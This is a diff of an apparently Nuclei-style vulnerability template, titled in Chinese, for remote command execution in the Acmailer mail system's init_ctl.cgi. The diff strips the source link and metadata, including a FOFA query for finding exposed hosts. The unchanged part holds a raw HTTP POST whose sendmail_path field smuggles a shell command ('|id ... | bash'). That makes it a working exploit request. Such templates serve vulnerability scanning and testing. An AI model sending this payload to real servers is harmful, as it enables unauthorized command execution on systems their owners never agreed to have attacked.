@@ -3,12 +3,8 @@ info:
   name: Acmailer邮件系统 init_ctl.cgi 远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xy382h0hdkvudk7m'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xy382h0hdkvudk7m
-    fofa: body="CGI acmailer"
 http:
 - raw:
   - 'POST /init_ctl.cgi HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Accept-Encoding: gzip
-
-
 
 
     admin_name=u&admin_email=m@m.m&login_id=l&login_pass=l&sendmail_path=|id >dudesite.txt | bash&homeurl=http://&mypath=e
